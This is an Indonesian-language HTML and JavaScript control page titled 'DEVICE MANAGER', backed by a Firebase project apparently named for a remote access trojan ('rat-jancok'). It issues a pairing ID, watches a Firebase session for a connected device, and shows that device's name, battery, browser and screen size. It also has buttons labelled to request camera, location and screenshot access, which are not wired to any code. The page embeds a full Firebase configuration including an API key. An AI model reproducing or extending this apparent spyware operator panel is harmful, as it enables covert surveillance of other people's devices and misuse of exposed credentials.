<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>DEVICE MANAGER</title>

<style>

*{
box-sizing:border-box;
font-family:Arial;
}

body{
margin:0;
background:#080808;
color:white;
}


header{

background:#b00000;
padding:20px;
text-align:center;
font-size:25px;
font-weight:bold;
box-shadow:0 0 20px red;

}


.container{
padding:15px;
}


.card{

background:#111;
border:1px solid #ff3333;
border-radius:15px;
padding:20px;
margin-bottom:15px;

}


.title{

color:#ff4444;
font-size:18px;

}



.online-dot{

width:10px;
height:10px;

display:inline-block;

background:#00ff66;

border-radius:50%;

animation:pulse 1s infinite;

box-shadow:0 0 15px #00ff66;

}



@keyframes pulse{

50%{

transform:scale(1.5);

opacity:.4;

}

}



.code{

text-align:center;

font-size:25px;

letter-spacing:3px;

color:#00ff99;

}



button{

width:100%;

padding:13px;

margin-top:10px;

border:0;

border-radius:10px;

background:red;

color:white;

font-size:16px;

}



.device{

background:#181818;

padding:15px;

border-radius:12px;

margin-top:10px;

cursor:pointer;

}



.detail{

display:none;

}


.info{

line-height:1.8;

}


.permission{

background:#222;

padding:15px;

margin-top:10px;

border-radius:10px;

}

</style>

</head>


<body>


<header>
📱 MANAGE DEVICE
</header>


<div class="container">


<div class="card">

<div class="title">
STATUS
</div>

<span class="online-dot"></span>

Dashboard Aktif

<br><br>

Perangkat:

<b id="count">
0
</b>

</div>



<div class="card">


<div class="title">
PAIRING ID
</div>


<div class="code" id="pairID">

026AF5359DC433B9

</div>


<button onclick="copyID()">

📋 Salin ID

</button>


</div>



<div class="card">


<div class="title">
DEVICE LIST
</div>


<div id="deviceList">

Belum ada device

</div>


</div>



<div class="card detail" id="detail">


<div class="title">

DEVICE DETAIL

</div>


<div id="deviceInfo" class="info">

-

</div>



<div class="permission">

📷 Kamera

<button>

Minta Izin Kamera

</button>

</div>



<div class="permission">

📍 Lokasi

<button>

Minta Izin Lokasi

</button>

</div>



<div class="permission">

🖥 Screenshot

<button>

Minta Izin Screenshot

</button>

</div>



</div>



</div>




<script type="module">


import {initializeApp}

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";


import {

getDatabase,

ref,

set,

get,

onValue

}

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";



const firebaseConfig={


apiKey:"AIzaSyCnGnqV6fKvO3XDLBucrsIYPjGuafTun7g",

authDomain:"rat-jancok.firebaseapp.com",

databaseURL:"https://rat-jancok-default-rtdb.asia-southeast1.firebasedatabase.app",

projectId:"rat-jancok",

storageBucket:"rat-jancok.firebasestorage.app",

messagingSenderId:"832199244613",

appId:"1:832199244613:web:d40428c4fd6e73d37d1c2c"

};



const app=initializeApp(firebaseConfig);

const db=getDatabase(app);



const id="026AF5359DC433B9";


const sessionRef=ref(db,"sessions/"+id);



get(sessionRef).then((snap)=>{

if(!snap.exists()){

set(sessionRef,{

created:Date.now(),

connected:false

});

}

});





onValue(sessionRef,(snap)=>{


let data=snap.val();



if(data && data.connected===true){



document.getElementById("count").innerHTML="1";



let d=data.deviceInfo || {};



window.deviceData=d;



document.getElementById("deviceList").innerHTML=`

<div class="device" onclick="openDevice()">

<span class="online-dot"></span>

<b>📱 ${d.name || "Unknown Device"}</b>

<br>

🔋 Battery:
${d.battery || "-"}

<br>

Status:
Online

</div>

`;



}else{


document.getElementById("count").innerHTML="0";


document.getElementById("deviceList").innerHTML=
"Belum ada device";


}


});




window.openDevice=function(){


let d=window.deviceData;


document.getElementById("detail").style.display="block";


document.getElementById("deviceInfo").innerHTML=`

📱 Nama Device :
${d.name || "-"}

<br>

🔋 Battery :
${d.battery || "-"}

<br>

🌐 Browser :
${d.browser || "-"}

<br>

📐 Screen :
${d.screen || "-"}

<br>

🟢 Status :
Online

`;

}




window.copyID=function(){

navigator.clipboard.writeText(

document.getElementById("pairID").innerText

);

alert("PAIRING ID DISALIN");

}



</script>


</body>
</html>
